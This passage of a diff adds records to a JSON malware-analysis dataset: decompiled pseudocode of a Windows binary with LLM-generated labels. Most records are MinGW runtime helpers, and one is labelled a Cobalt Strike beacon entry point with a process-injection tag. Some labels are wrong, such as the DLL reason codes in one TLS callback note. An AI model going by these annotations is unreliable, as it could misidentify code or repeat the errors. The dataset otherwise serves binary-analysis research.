+        "raw_pseudocode": "\nundefined8 _amsg_exit(uint param_1,undefined8 param_2,undefined8 param_3,int param_4)\n\n{\n  FILE *__stream;\n  undefined4 *puVar1;\n  undefined8 *puVar2;\n  undefined4 *puVar3;\n  char *pcVar4;\n  undefined8 *puVar5;\n  undefined4 *unaff_retaddr;\n  \n  __stream = (FILE *)__acrt_iob_func(2);\n  puVar5 = (undefined8 *)(ulonglong)param_1;\n  pcVar4 = \"runtime error %d\\n\";\n  fprintf(__stream,\"runtime error %d\\n\");\n  puVar3 = (undefined4 *)0xff;\n  _exit(0xff);\n  _initialize_narrow_environment();\n  _configure_narrow_argv(2 - (uint)(param_4 == 0));\n  puVar1 = (undefined4 *)__p___argc();\n  *puVar3 = *puVar1;\n  puVar2 = (undefined8 *)__p___argv();\n  *(undefined8 *)pcVar4 = *puVar2;\n  puVar2 = (undefined8 *)__p__environ();\n  *puVar5 = *puVar2;\n  _set_new_mode(*unaff_retaddr);\n  return 0;\n}\n\n"
+      },
+      {
+        "function_address": "5368716016",
+        "function_name": "__mingw_mark_section_writable",
+        "confidence": 0.9,
+        "parameters": [
+          {
+            "name": "addr",
+            "type": "void*"
+          }
+        ],
+        "return_type": "void",
+        "notes": "This MinGW-w64 runtime internal function initializes a cached array of PE sections on first call, then locates the section containing the input address and marks it writable via VirtualProtect to support runtime relocations. The initial error message, recursive error handler call, and abort are bogus control flow inserted for obfuscation and are unreachable in actual execution. Evidence includes callers _pei386_runtime_relocator (which requires writable sections for relocation patching) and mark_section_writable, along with use of MinGW PE helpers __mingw_GetSectionForAddress and _GetPEImageBase, and Windows APIs VirtualQuery and VirtualProtect.",
+        "behavior_tags": [
+          "utility"
+        ],
+        "source": "llm_judge",
+        "prompt_length": 9442,
+        "llm_audit": {
+          "request_model": null,
+          "response_model": "step-3.7-flash",
+          "response_id": "chatcmpl-c8f008513992b29dfa2a5662c4dcf723.019fdf37adf17c72b831e6d5ad4e6f21",
+          "system_fingerprint": null,
+          "prompt_tokens": 3139,
+          "completion_tokens": 13373,
+          "reasoning_tokens": 0,
+          "is_reasoning_model": false
+        },
+        "normalized_pseudocode": "\n/* WARNING: Function: ___chkstk_ms replaced with injection: alloca_probe */\n/* WARNING: Removing unreachable block (ram,0x000140001d49) */\n/* WARNING: Removing unreachable block (ram,0x000140001ec0) */\n/* WARNING: Removing unreachable block (ram,0x000140001ec8) */\n/* WARNING: Removing unreachable block (ram,0x00014000202b) */\n/* WARNING: Removing unreachable block (ram,0x000140002036) */\n/* WARNING: Removing unreachable block (ram,0x000140001d53) */\n/* WARNING: Removing unreachable block (ram,0x000140001d5d) */\n/* WARNING: Removing unreachable block (ram,0x000140001ed5) */\n/* WARNING: Removing unreachable block (ram,0x000140001ede) */\n/* WARNING: Removing unreachable block (ram,0x000140001ef0) */\n/* WARNING: Removing unreachable block (ram,0x000140001f20) */\n/* WARNING: Removing unreachable block (ram,0x000140001d68) */\n/* WARNING: Removing unreachable block (ram,0x000140001d74) */\n/* WARNING: Removing unreachable block (ram,0x000140001d84) */\n/* WARNING: Removing unreachable block (ram,0x000140001dfd) */\n/* WARNING: Removing unreachable block (ram,0x000140001f80) */\n/* WARNING: Removing unreachable block (ram,0x000140001f8b) */\n/* WARNING: Removing unreachable block (ram,0x000140001e19) */\n/* WARNING: Removing unreachable block (ram,0x000140001d90) */\n/* WARNING: Removing unreachable block (ram,0x000140001f28) */\n/* WARNING: Removing unreachable block (ram,0x000140002020) */\n/* WARNING: Removing unreachable block (ram,0x000140001f34) */\n/* WARNING: Removing unreachable block (ram,0x000140001f40) */\n/* WARNING: Removing unreachable block (ram,0x000140001f4e) */\n/* WARNING: Removing unreachable block (ram,0x000140001f5a) */\n/* WARNING: Removing unreachable block (ram,0x000140001d99) */\n/* WARNING: Removing unreachable block (ram,0x000140001da2) */\n/* WARNING: Removing unreachable block (ram,0x000140001fe0) */\n/* WARNING: Removing unreachable block (ram,0x000140001daf) */\n/* WARNING: Removing unreachable block (ram,0x000140001dcb) */\n/* WARNING: Removing unreachable block (ram,0x000140001dd7) */\n/* WARNING: Removing unreachable block (ram,0x000140001ff6) */\n/* WARNING: Removing unreachable block (ram,0x000140002010) */\n/* WARNING: Removing unreachable block (ram,0x000140001f9e) */\n/* WARNING: Removing unreachable block (ram,0x000140001fac) */\n/* WARNING: Removing unreachable block (ram,0x000140001fb4) */\n/* WARNING: Removing unreachable block (ram,0x000140001df4) */\n/* WARNING: Removing unreachable block (ram,0x000140001e1f) */\n/* WARNING: Removing unreachable block (ram,0x00014000203f) */\n/* WARNING: Removing unreachable block (ram,0x000140002053) */\n/* WARNING: Removing unreachable block (ram,0x000140002070) */\n/* WARNING: Removing unreachable block (ram,0x000140002099) */\n/* WARNING: Removing unreachable block (ram,0x000140001e28) */\n/* WARNING: Removing unreachable block (ram,0x000140001e5b) */\n/* WARNING: Removing unreachable block (ram,0x000140001e60) */\n/* WARNING: Removing unreachable block (ram,0x000140001e6e) */\n/* WARNING: Removing unreachable block (ram,0x000140001e80) */\n/* WARNING: Removing unreachable block (ram,0x000140001e92) */\n/* WARNING: Removing unreachable block (ram,0x000140001e9f) */\n/* WARNING: Removing unreachable block (ram,0x000140001eae) */\n\nvoid _text(char *param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)\n\n{\n  undefined1 *puVar1;\n  int tmp_iVar2;\n  undefined4 tmp_uVar3;\n  FILE *tmp_pFVar4;\n  ulonglong *puVar5;\n  longlong tmp_lVar6;\n  longlong tmp_lVar7;\n  ulonglong tmp_uVar8;\n  undefined8 tmp_uVar9;\n  uint tmp_uVar10;\n  undefined8 local_res10;\n  undefined8 local_res18;\n  undefined8 local_res20;\n  undefined1 auStack_f8 [16];\n  FILE *pFStack_e8;\n  ulonglong uStack_e0;\n  longlong lStack_d8;\n  char *apcStack_90 [3];\n  char *pcStack_78;\n  int iStack_6c;\n  char *pcStack_60;\n  undefined8 *puStack_58;\n  \n  local_res10 = param_2;\n  local_res18 = param_3;\n  local_res20 = param_4;\n  tmp_pFVar4 = (FILE *)__acrt_iob_func(2);\n  fprintf(tmp_pFVar4,\"Mingw-w64 runtime failure:\\n\");\n  tmp_pFVar4 = (FILE *)__acrt_iob_func(2);\n  _text(tmp_pFVar4,param_1,&local_res10);\n  abort();\n  tmp_uVar8 = (ulonglong)maxSections;\n  pcStack_60 = param_1;\n  puStack_58 = &local_res10;\n  if ((int)maxSections < 1) goto LAB_140001c80;\n  tmp_uVar10 = 0;\n  puVar5 = (ulonglong *)(the_secs + 0x18);\n  do {\n    if (((FILE *)*puVar5 <= tmp_pFVar4) &&\n       (tmp_pFVar4 < (FILE *)(((FILE *)*puVar5)->_shortbuf +\n                         ((ulonglong)*(uint *)(puVar5[1] + 8) - 0x7f)))) {\n      return;\n    }\n    tmp_uVar10 = tmp_uVar10 + 1;\n    puVar5 = puVar5 + 5;\n  } while (tmp_uVar10 != maxSections);\n  do {\n    tmp_lVar6 = __mingw_GetSectionForAddress(tmp_pFVar4);\n    if (tmp_lVar6 == 0) {\nLAB_140001ca2:\n      _text(\"Address %p has no image-section\",tmp_pFVar4);\n      if (was_init_0 == 0) {\n        was_init_0 = 1;\n        pFStack_e8 = tmp_pFVar4;\n        uStack_e0 = tmp_uVar8;\n        lStack_d8 = tmp_lVar6;\n        tmp_iVar2 = __mingw_GetSectionCount();\n        maxSections = 0;\n        the_secs = auStack_f8 + -((longlong)tmp_iVar2 * 0x28 + 0xfU & -16);\n      }\n      return;\n    }\n    tmp_pFVar4 = (FILE *)(tmp_uVar8 * 0x28);\n    puVar1 = the_secs + -0x7f;\n    *(longlong *)(tmp_pFVar4->_shortbuf + (longlong)puVar1 + 0x20) = tmp_lVar6;\n    *(undefined4 *)(tmp_pFVar4->_shortbuf + (longlong)puVar1) = 0;\n    tmp_lVar7 = _GetPEImageBase();\n    tmp_lVar7 = tmp_lVar7 + (ulonglong)*(uint *)(tmp_lVar6 + 0xc);\n    *(longlong *)(tmp_pFVar4->_shortbuf + (longlong)(the_secs + -0x67)) = tmp_lVar7;\n    tmp_lVar7 = VirtualQuery(tmp_lVar7,apcStack_90,0x30);\n    if (tmp_lVar7 == 0) {\n      _text(\"  VirtualQuery failed for %d bytes at address %p\",*(undefined4 *)(tmp_lVar6 + 8),\n            *(undefined8 *)(tmp_pFVar4->_shortbuf + (longlong)(the_secs + -0x67)));\n      goto LAB_140001ca2;\n    }\n    if (((iStack_6c - 4U & -5) == 0) || ((iStack_6c - 0x40U & -65) == 0)) {\nLAB_140001c1e:\n      maxSections = maxSections + 1;\n      return;\n    }\n    tmp_uVar9 = 0x40;\n    if (iStack_6c == 2) {\n      tmp_uVar9 = 4;\n    }\n    tmp_pFVar4 = (FILE *)(tmp_pFVar4->_shortbuf + (longlong)(the_secs + -0x7f));\n    tmp_pFVar4->_IO_read_ptr = apcStack_90[0];\n    tmp_pFVar4->_IO_read_end = pcStack_78;\n    tmp_iVar2 = VirtualProtect(apcStack_90[0],pcStack_78,tmp_uVar9,tmp_pFVar4);\n    if (tmp_iVar2 != 0) goto LAB_140001c1e;\n    tmp_uVar3 = GetLastError();\n    _text(\"  VirtualProtect failed with code 0x%x\",tmp_uVar3);\nLAB_140001c80:\n    tmp_uVar8 = 0;\n  } while( true );\n}\n",
+        "raw_pseudocode": "\n/* WARNING: Function: ___chkstk_ms replaced with injection: alloca_probe */\n/* WARNING: Removing unreachable block (ram,0x000140001d49) */\n/* WARNING: Removing unreachable block (ram,0x000140001ec0) */\n/* WARNING: Removing unreachable block (ram,0x000140001ec8) */\n/* WARNING: Removing unreachable block (ram,0x00014000202b) */\n/* WARNING: Removing unreachable block (ram,0x000140002036) */\n/* WARNING: Removing unreachable block (ram,0x000140001d53) */\n/* WARNING: Removing unreachable block (ram,0x000140001d5d) */\n/* WARNING: Removing unreachable block (ram,0x000140001ed5) */\n/* WARNING: Removing unreachable block (ram,0x000140001ede) */\n/* WARNING: Removing unreachable block (ram,0x000140001ef0) */\n/* WARNING: Removing unreachable block (ram,0x000140001f20) */\n/* WARNING: Removing unreachable block (ram,0x000140001d68) */\n/* WARNING: Removing unreachable block (ram,0x000140001d74) */\n/* WARNING: Removing unreachable block (ram,0x000140001d84) */\n/* WARNING: Removing unreachable block (ram,0x000140001dfd) */\n/* WARNING: Removing unreachable block (ram,0x000140001f80) */\n/* WARNING: Removing unreachable block (ram,0x000140001f8b) */\n/* WARNING: Removing unreachable block (ram,0x000140001e19) */\n/* WARNING: Removing unreachable block (ram,0x000140001d90) */\n/* WARNING: Removing unreachable block (ram,0x000140001f28) */\n/* WARNING: Removing unreachable block (ram,0x000140002020) */\n/* WARNING: Removing unreachable block (ram,0x000140001f34) */\n/* WARNING: Removing unreachable block (ram,0x000140001f40) */\n/* WARNING: Removing unreachable block (ram,0x000140001f4e) */\n/* WARNING: Removing unreachable block (ram,0x000140001f5a) */\n/* WARNING: Removing unreachable block (ram,0x000140001d99) */\n/* WARNING: Removing unreachable block (ram,0x000140001da2) */\n/* WARNING: Removing unreachable block (ram,0x000140001fe0) */\n/* WARNING: Removing unreachable block (ram,0x000140001daf) */\n/* WARNING: Removing unreachable block (ram,0x000140001dcb) */\n/* WARNING: Removing unreachable block (ram,0x000140001dd7) */\n/* WARNING: Removing unreachable block (ram,0x000140001ff6) */\n/* WARNING: Removing unreachable block (ram,0x000140002010) */\n/* WARNING: Removing unreachable block (ram,0x000140001f9e) */\n/* WARNING: Removing unreachable block (ram,0x000140001fac) */\n/* WARNING: Removing unreachable block (ram,0x000140001fb4) */\n/* WARNING: Removing unreachable block (ram,0x000140001df4) */\n/* WARNING: Removing unreachable block (ram,0x000140001e1f) */\n/* WARNING: Removing unreachable block (ram,0x00014000203f) */\n/* WARNING: Removing unreachable block (ram,0x000140002053) */\n/* WARNING: Removing unreachable block (ram,0x000140002070) */\n/* WARNING: Removing unreachable block (ram,0x000140002099) */\n/* WARNING: Removing unreachable block (ram,0x000140001e28) */\n/* WARNING: Removing unreachable block (ram,0x000140001e5b) */\n/* WARNING: Removing unreachable block (ram,0x000140001e60) */\n/* WARNING: Removing unreachable block (ram,0x000140001e6e) */\n/* WARNING: Removing unreachable block (ram,0x000140001e80) */\n/* WARNING: Removing unreachable block (ram,0x000140001e92) */\n/* WARNING: Removing unreachable block (ram,0x000140001e9f) */\n/* WARNING: Removing unreachable block (ram,0x000140001eae) */\n\nvoid _text(char *param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)\n\n{\n  undefined1 *puVar1;\n  int iVar2;\n  undefined4 uVar3;\n  FILE *pFVar4;\n  ulonglong *puVar5;\n  longlong lVar6;\n  longlong lVar7;\n  ulonglong uVar8;\n  undefined8 uVar9;\n  uint uVar10;\n  undefined8 local_res10;\n  undefined8 local_res18;\n  undefined8 local_res20;\n  undefined1 auStack_f8 [16];\n  FILE *pFStack_e8;\n  ulonglong uStack_e0;\n  longlong lStack_d8;\n  char *apcStack_90 [3];\n  char *pcStack_78;\n  int iStack_6c;\n  char *pcStack_60;\n  undefined8 *puStack_58;\n  \n  local_res10 = param_2;\n  local_res18 = param_3;\n  local_res20 = param_4;\n  pFVar4 = (FILE *)__acrt_iob_func(2);\n  fprintf(pFVar4,\"Mingw-w64 runtime failure:\\n\");\n  pFVar4 = (FILE *)__acrt_iob_func(2);\n  _text(pFVar4,param_1,&local_res10);\n  abort();\n  uVar8 = (ulonglong)maxSections;\n  pcStack_60 = param_1;\n  puStack_58 = &local_res10;\n  if ((int)maxSections < 1) goto LAB_140001c80;\n  uVar10 = 0;\n  puVar5 = (ulonglong *)(the_secs + 0x18);\n  do {\n    if (((FILE *)*puVar5 <= pFVar4) &&\n       (pFVar4 < (FILE *)(((FILE *)*puVar5)->_shortbuf +\n                         ((ulonglong)*(uint *)(puVar5[1] + 8) - 0x7f)))) {\n      return;\n    }\n    uVar10 = uVar10 + 1;\n    puVar5 = puVar5 + 5;\n  } while (uVar10 != maxSections);\n  do {\n    lVar6 = __mingw_GetSectionForAddress(pFVar4);\n    if (lVar6 == 0) {\nLAB_140001ca2:\n      _text(\"Address %p has no image-section\",pFVar4);\n      if (was_init_0 == 0) {\n        was_init_0 = 1;\n        pFStack_e8 = pFVar4;\n        uStack_e0 = uVar8;\n        lStack_d8 = lVar6;\n        iVar2 = __mingw_GetSectionCount();\n        maxSections = 0;\n        the_secs = auStack_f8 + -((longlong)iVar2 * 0x28 + 0xfU & 0xfffffffffffffff0);\n      }\n      return;\n    }\n    pFVar4 = (FILE *)(uVar8 * 0x28);\n    puVar1 = the_secs + -0x7f;\n    *(longlong *)(pFVar4->_shortbuf + (longlong)puVar1 + 0x20) = lVar6;\n    *(undefined4 *)(pFVar4->_shortbuf + (longlong)puVar1) = 0;\n    lVar7 = _GetPEImageBase();\n    lVar7 = lVar7 + (ulonglong)*(uint *)(lVar6 + 0xc);\n    *(longlong *)(pFVar4->_shortbuf + (longlong)(the_secs + -0x67)) = lVar7;\n    lVar7 = VirtualQuery(lVar7,apcStack_90,0x30);\n    if (lVar7 == 0) {\n      _text(\"  VirtualQuery failed for %d bytes at address %p\",*(undefined4 *)(lVar6 + 8),\n            *(undefined8 *)(pFVar4->_shortbuf + (longlong)(the_secs + -0x67)));\n      goto LAB_140001ca2;\n    }\n    if (((iStack_6c - 4U & 0xfffffffb) == 0) || ((iStack_6c - 0x40U & 0xffffffbf) == 0)) {\nLAB_140001c1e:\n      maxSections = maxSections + 1;\n      return;\n    }\n    uVar9 = 0x40;\n    if (iStack_6c == 2) {\n      uVar9 = 4;\n    }\n    pFVar4 = (FILE *)(pFVar4->_shortbuf + (longlong)(the_secs + -0x7f));\n    pFVar4->_IO_read_ptr = apcStack_90[0];\n    pFVar4->_IO_read_end = pcStack_78;\n    iVar2 = VirtualProtect(apcStack_90[0],pcStack_78,uVar9,pFVar4);\n    if (iVar2 != 0) goto LAB_140001c1e;\n    uVar3 = GetLastError();\n    _text(\"  VirtualProtect failed with code 0x%x\",uVar3);\nLAB_140001c80:\n    uVar8 = 0;\n  } while( true );\n}\n\n"
+      },
+      {
+        "function_address": "5368715616",
+        "function_name": "mingw_tls_process_attach_callback",
+        "confidence": 0.9,
+        "parameters": [
+          {
+            "name": "hmodule",
+            "type": "void*"
+          },
+          {
+            "name": "dw_reason",
+            "type": "int"
+          }
+        ],
+        "return_type": "void",
+        "notes": "This is a MinGW TLS callback that initializes the C runtime multithread state (_CRT_MT) and invokes the MinGW TLS handler (__mingw_TLScallback) only when the DLL reason is DLL_PROCESS_ATTACH (1), excluding DLL_THREAD_ATTACH (2). It is called by the C runtime startup function __tmainCRTStartup during process initialization, consistent with neighboring CRT initialization functions like __do_global_ctors and __main.",
+        "behavior_tags": [
+          "utility"
+        ],
+        "source": "llm_judge",
+        "prompt_length": 3189,
+        "llm_audit": {
+          "request_model": null,
+          "response_model": "step-3.7-flash",
+          "response_id": "chatcmpl-24a54de010d033e262213a84a6afa58c.019fdf3948827ec3980459d6e4d3096d",
+          "system_fingerprint": null,
+          "prompt_tokens": 957,
+          "completion_tokens": 2953,
+          "reasoning_tokens": 0,
+          "is_reasoning_model": false
+        },
+        "normalized_pseudocode": "\n/* WARNING: Removing unreachable block (ram,0x0001400019a5) */\n/* WARNING: Removing unreachable block (ram,0x0001400019b0) */\n/* WARNING: Removing unreachable block (ram,0x0001400019b8) */\n/* WARNING: Removing unreachable block (ram,0x0001400019ba) */\n/* WARNING: Removing unreachable block (ram,0x0001400019c3) */\n\nvoid tls_callback_0(undefined8 param_1,int param_2)\n\n{\n  if (_CRT_MT != 2) {\n    _CRT_MT = 2;\n  }\n  if ((param_2 != 2) && (param_2 == 1)) {\n    __mingw_TLScallback();\n    return;\n  }\n  return;\n}\n",
+        "raw_pseudocode": "\n/* WARNING: Removing unreachable block (ram,0x0001400019a5) */\n/* WARNING: Removing unreachable block (ram,0x0001400019b0) */\n/* WARNING: Removing unreachable block (ram,0x0001400019b8) */\n/* WARNING: Removing unreachable block (ram,0x0001400019ba) */\n/* WARNING: Removing unreachable block (ram,0x0001400019c3) */\n\nvoid tls_callback_0(undefined8 param_1,int param_2)\n\n{\n  if (_CRT_MT != 2) {\n    _CRT_MT = 2;\n  }\n  if ((param_2 != 2) && (param_2 == 1)) {\n    __mingw_TLScallback();\n    return;\n  }\n  return;\n}\n\n"
+      },
+      {
+        "function_address": "5368715584",
+        "function_name": "min_gw_tls_callback_wrapper",
+        "confidence": 0.9,
+        "parameters": [
+          {
+            "name": "module_handle",
+            "type": "HMODULE"
+          },
+          {
+            "name": "callback_reason",
+            "type": "DWORD"
+          }
+        ],
+        "return_type": "void",
+        "notes": "This function is a TLS callback (evidenced by neighboring tls_callback_0 and standard TLS callback structure) that acts as a filtered wrapper for the resolved MinGW TLS handler __mingw_tls_callback. It only forwards TLS callback events with reason codes 0 (DLL_PROCESS_ATTACH) and 3 (DLL_PROCESS_DETACH) to the MinGW handler, ignoring thread-related attach/detach events, and supports MinGW runtime initialization and cleanup for the binary.",
+        "behavior_tags": [
+          "utility"
+        ],
+        "source": "llm_judge",
+        "prompt_length": 2755,
+        "llm_audit": {
+          "request_model": null,
+          "response_model": "step-3.7-flash",
+          "response_id": "chatcmpl-26ad9b156da63f0ccafae2fb5e6236af.019fdf3948bf763cad857e238bc09cca",
+          "system_fingerprint": null,
+          "prompt_tokens": 803,
+          "completion_tokens": 5203,
+          "reasoning_tokens": 0,
+          "is_reasoning_model": false
+        },
+        "normalized_pseudocode": "\nvoid tls_callback_1(undefined8 param_1,int param_2)\n\n{\n  if ((param_2 != 3) && (param_2 != 0)) {\n    return;\n  }\n  __mingw_TLScallback();\n  return;\n}\n",
+        "raw_pseudocode": "\nvoid tls_callback_1(undefined8 param_1,int param_2)\n\n{\n  if ((param_2 != 3) && (param_2 != 0)) {\n    return;\n  }\n  __mingw_TLScallback();\n  return;\n}\n\n"
+      },
+      {
+        "function_address": "5368720352",
+        "function_name": "cobalt_beacon_main",
+        "confidence": 0.9,
+        "parameters": [],
+        "return_type": "void",
+        "notes": "This function acts as the C runtime startup bridge for a Cobalt Strike beacon, initializing the CRT, parsing the command line to extract the correct lpCmdLine for WinMain (handling DBCS lead bytes and quoted arguments), retrieving STARTUPINFOA to set the nCmdShow parameter (defaulting to SW_SHOWDEFAULT if the STARTF_FORCEOFFFEEDBACK flag is unset), then invoking the beacon's core cobalt_beacon_inject_and_cleanup routine (decompiled as WinMain) with the prepared arguments. Evidence includes the caller __tmainCRTStartup (standard CRT GUI entry point), the resolved direct callee cobalt_beacon_inject_and_cleanup, and neighboring process enumeration APIs (CreateToolhelp32Snapshot, Process32First, Process32Next) used for injection target selection in Cobalt Strike beacons.",
+        "behavior_tags": [
+          "process-injection",
+          "utility"
+        ],
+        "source": "llm_judge",
+        "prompt_length": 4275,
+        "llm_audit": {
+          "request_model": null,
+          "response_model": "step-3.7-flash",
+          "response_id": "chatcmpl-e5bad87f60a0039003faef5751cafe8d.019fdf39488b727b99d3c2f3996e7055",
+          "system_fingerprint": null,
+          "prompt_tokens": 1382,
+          "completion_tokens": 10418,
+          "reasoning_tokens": 0,
+          "is_reasoning_model": false
+        },
+        "normalized_pseudocode": "\nvoid main(void)\n\n{\n  char *pcVar1;\n  bool tmp_bVar2;\n  bool tmp_bVar3;\n  bool tmp_bVar4;\n  int tmp_iVar5;\n  undefined8 *puVar6;\n  char tmp_cVar7;\n  char *pcVar8;\n  undefined1 local_88 [60];\n  undefined2 local_48;\n  \n  tmp_bVar3 = false;\n  tmp_bVar2 = false;\n  __main();\n  puVar6 = (undefined8 *)__p__acmdln();\n  pcVar8 = (char *)*puVar6;\n  if (pcVar8 == (char *)0x0) {\n    pcVar8 = \"\";\n  }\n  else {\nLAB_140002c10:\n    tmp_cVar7 = *pcVar8;\n    if (' ' < tmp_cVar7) goto LAB_140002c3d;\n    while (tmp_cVar7 != '\\0') {\n      if (!tmp_bVar2) goto LAB_140002c64;\n      tmp_iVar5 = IsDBCSLeadByte();\n      pcVar1 = pcVar8;\n      while( true ) {\n        pcVar8 = pcVar1 + 1;\n        if ((tmp_iVar5 == 0) || (pcVar1[1] == '\\0')) goto LAB_140002c10;\n        tmp_cVar7 = pcVar1[2];\n        pcVar8 = pcVar1 + 2;\n        if (tmp_cVar7 < '!') break;\nLAB_140002c3d:\n        tmp_bVar4 = (bool)(tmp_bVar2 ^ 1);\n        tmp_bVar2 = tmp_bVar3;\n        if (tmp_cVar7 == '\\\"') {\n          tmp_bVar2 = tmp_bVar4;\n        }\n        tmp_iVar5 = IsDBCSLeadByte();\n        pcVar1 = pcVar8;\n        tmp_bVar3 = tmp_bVar2;\n      }\n    }\n  }\n  goto LAB_140002c70;\n  while (*pcVar1 < '!') {\nLAB_140002c64:\n    pcVar1 = pcVar8 + 1;\n    pcVar8 = pcVar8 + 1;\n    if (*pcVar1 == '\\0') break;\n  }\nLAB_140002c70:\n  GetStartupInfoA(local_88);\n  if ((local_4c & 1) == 0) {\n    local_48 = 10;\n  }\n  WinMain(&IMAGE_DOS_HEADER_140000000,0,pcVar8,local_48);\n  return;\n}\n",
+        "raw_pseudocode": "\nvoid main(void)\n\n{\n  char *pcVar1;\n  bool bVar2;\n  bool bVar3;\n  bool bVar4;\n  int iVar5;\n  undefined8 *puVar6;\n  char cVar7;\n  char *pcVar8;\n  undefined1 local_88 [60];\n  byte local_4c;\n  undefined2 local_48;\n  \n  bVar3 = false;\n  bVar2 = false;\n  __main();\n  puVar6 = (undefined8 *)__p__acmdln();\n  pcVar8 = (char *)*puVar6;\n  if (pcVar8 == (char *)0x0) {\n    pcVar8 = \"\";\n  }\n  else {\nLAB_140002c10:\n    cVar7 = *pcVar8;\n    if (' ' < cVar7) goto LAB_140002c3d;\n    while (cVar7 != '\\0') {\n      if (!bVar2) goto LAB_140002c64;\n      iVar5 = IsDBCSLeadByte();\n      pcVar1 = pcVar8;\n      while( true ) {\n        pcVar8 = pcVar1 + 1;\n        if ((iVar5 == 0) || (pcVar1[1] == '\\0')) goto LAB_140002c10;\n        cVar7 = pcVar1[2];\n        pcVar8 = pcVar1 + 2;\n        if (cVar7 < '!') break;\nLAB_140002c3d:\n        bVar4 = (bool)(bVar2 ^ 1);\n        bVar2 = bVar3;\n        if (cVar7 == '\\\"') {\n          bVar2 = bVar4;\n        }\n        iVar5 = IsDBCSLeadByte();\n        pcVar1 = pcVar8;\n        bVar3 = bVar2;\n      }\n    }\n  }\n  goto LAB_140002c70;\n  while (*pcVar1 < '!') {\nLAB_140002c64:\n    pcVar1 = pcVar8 + 1;\n    pcVar8 = pcVar8 + 1;\n    if (*pcVar1 == '\\0') break;\n  }\nLAB_140002c70:\n  GetStartupInfoA(local_88);\n  if ((local_4c & 1) == 0) {\n    local_48 = 10;\n  }\n  WinMain(&IMAGE_DOS_HEADER_140000000,0,pcVar8,local_48);\n  return;\n}\n\n"
+      },
+      {
+        "function_address": "5368716112",
+        "function_name": "ensure_target_section_writable",
+        "confidence": 0.9,
+        "parameters": [
+          {
+            "name": "target_addr",
+            "type": "void*"
+          }
+        ],
+        "return_type": "void",
+        "notes": "This function ensures the PE section containing the input target address is writable, using a cache of processed sections to avoid redundant VirtualProtect calls. It is called by _pei386_runtime_relocator (5368716480) to prepare memory for applying relocation fixes, using __mingw_GetSectionForAddress to resolve address-to-section mappings, VirtualQuery to check existing memory protection, and VirtualProtect to set PAGE_READWRITE or PAGE_EXECUTE_READWRITE as needed. Error messages are logged for failed VirtualQuery/VirtualProtect operations or addresses with no associated image section.",
+        "behavior_tags": [
+          "utility"
+        ],
+        "source": "llm_judge",
+        "prompt_length": 8714,
+        "llm_audit": {
+          "request_model": null,
+          "response_model": "step-3.7-flash",
+          "response_id": "chatcmpl-f3821b69c62c5098e94efffa13cd5d94.019fdf3948ba7c7ebbf9370c51069765",
+          "system_fingerprint": null,
+          "prompt_tokens": 2845,
+          "completion_tokens": 11797,
+          "reasoning_tokens": 0,
+          "is_reasoning_model": false
+        },
+        "normalized_pseudocode": "\n/* WARNING: Function: ___chkstk_ms replaced with injection: alloca_probe */\n/* WARNING: Removing unreachable block (ram,0x000140001d49) */\n/* WARNING: Removing unreachable block (ram,0x000140001ec0) */\n/* WARNING: Removing unreachable block (ram,0x000140001ec8) */\n/* WARNING: Removing unreachable block (ram,0x00014000202b) */\n/* WARNING: Removing unreachable block (ram,0x000140002036) */\n/* WARNING: Removing unreachable block (ram,0x000140001d53) */\n/* WARNING: Removing unreachable block (ram,0x000140001d5d) */\n/* WARNING: Removing unreachable block (ram,0x000140001ed5) */\n/* WARNING: Removing unreachable block (ram,0x000140001ede) */\n/* WARNING: Removing unreachable block (ram,0x000140001ef0) */\n/* WARNING: Removing unreachable block (ram,0x000140001f20) */\n/* WARNING: Removing unreachable block (ram,0x000140001d68) */\n/* WARNING: Removing unreachable block (ram,0x000140001d74) */\n/* WARNING: Removing unreachable block (ram,0x000140001d84) */\n/* WARNING: Removing unreachable block (ram,0x000140001dfd) */\n/* WARNING: Removing unreachable block (ram,0x000140001f80) */\n/* WARNING: Removing unreachable block (ram,0x000140001f8b) */\n/* WARNING: Removing unreachable block (ram,0x000140001e19) */\n/* WARNING: Removing unreachable block (ram,0x000140001d90) */\n/* WARNING: Removing unreachable block (ram,0x000140001f28) */\n/* WARNING: Removing unreachable block (ram,0x000140002020) */\n/* WARNING: Removing unreachable block (ram,0x000140001f34) */\n/* WARNING: Removing unreachable block (ram,0x000140001f40) */\n/* WARNING: Removing unreachable block (ram,0x000140001f4e) */\n/* WARNING: Removing unreachable block (ram,0x000140001f5a) */\n/* WARNING: Removing unreachable block (ram,0x000140001d99) */\n/* WARNING: Removing unreachable block (ram,0x000140001da2) */\n/* WARNING: Removing unreachable block (ram,0x000140001fe0) */\n/* WARNING: Removing unreachable block (ram,0x000140001daf) */\n/* WARNING: Removing unreachable block (ram,0x000140001dcb) */\n/* WARNING: Removing unreachable block (ram,0x000140001dd7) */\n/* WARNING: Removing unreachable block (ram,0x000140001ff6) */\n/* WARNING: Removing unreachable block (ram,0x000140002010) */\n/* WARNING: Removing unreachable block (ram,0x000140001f9e) */\n/* WARNING: Removing unreachable block (ram,0x000140001fac) */\n/* WARNING: Removing unreachable block (ram,0x000140001fb4) */\n/* WARNING: Removing unreachable block (ram,0x000140001df4) */\n/* WARNING: Removing unreachable block (ram,0x000140001e1f) */\n/* WARNING: Removing unreachable block (ram,0x00014000203f) */\n/* WARNING: Removing unreachable block (ram,0x000140002053) */\n/* WARNING: Removing unreachable block (ram,0x000140002070) */\n/* WARNING: Removing unreachable block (ram,0x000140002099) */\n/* WARNING: Removing unreachable block (ram,0x000140001e28) */\n/* WARNING: Removing unreachable block (ram,0x000140001e5b) */\n/* WARNING: Removing unreachable block (ram,0x000140001e60) */\n/* WARNING: Removing unreachable block (ram,0x000140001e6e) */\n/* WARNING: Removing unreachable block (ram,0x000140001e80) */\n/* WARNING: Removing unreachable block (ram,0x000140001e92) */\n/* WARNING: Removing unreachable block (ram,0x000140001e9f) */\n/* WARNING: Removing unreachable block (ram,0x000140001eae) */\n/* WARNING: Type propagation algorithm not settling */\n\nvoid mark_section_writable(ulonglong param_1)\n\n{\n  int tmp_iVar1;\n  undefined4 tmp_uVar2;\n  ulonglong *puVar3;\n  longlong tmp_lVar4;\n  undefined4 *puVar5;\n  longlong tmp_lVar6;\n  ulonglong tmp_uVar7;\n  undefined8 tmp_uVar8;\n  uint tmp_uVar9;\n  undefined1 auStack_b0 [16];\n  ulonglong uStack_a0;\n  ulonglong uStack_98;\n  longlong lStack_90;\n  undefined8 local_48 [3];\n  undefined8 local_30;\n  \n  tmp_uVar7 = (ulonglong)maxSections;\n  if ((int)maxSections < 1) goto LAB_140001c80;\n  tmp_uVar9 = 0;\n  